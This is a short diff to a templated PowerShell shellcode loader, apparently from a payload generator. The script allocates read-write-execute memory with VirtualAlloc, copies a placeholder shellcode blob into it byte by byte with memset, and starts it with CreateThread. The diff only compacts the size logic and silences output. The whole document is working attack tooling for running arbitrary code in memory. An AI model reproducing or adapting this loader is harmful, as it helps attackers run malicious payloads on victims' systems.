@@ -11,16 +11,10 @@ $%{var_win32_func} = Add-Type -memberDefinition $%{var_syscode} -Name "Win32" -n
 
 %{shellcode}
 
-$%{var_size} = 0x1000
-
-if ($%{var_code}.Length -gt 0x1000) {
-	$%{var_size} = $%{var_code}.Length
-}
-$%{var_rwx} = $%{var_win32_func}::VirtualAlloc(0,0x1000,$%{var_size},0x40)
+$%{var_rwx} = $%{var_win32_func}::VirtualAlloc(0,0x1000,[Math]::Max($%{var_code}.Length, 0x1000),0x40)
 
 for ($%{var_iter}=0;$%{var_iter} -le ($%{var_code}.Length-1);$%{var_iter}++) {
-	$%{var_win32_func}::memset([IntPtr]($%{var_rwx}.ToInt32()+$%{var_iter}), $%{var_code}[$%{var_iter}], 1)
+	$%{var_win32_func}::memset([IntPtr]($%{var_rwx}.ToInt32()+$%{var_iter}), $%{var_code}[$%{var_iter}], 1) | Out-Null
 }
 
 $%{var_win32_func}::CreateThread(0,0,$%{var_rwx},0,0,0)
-
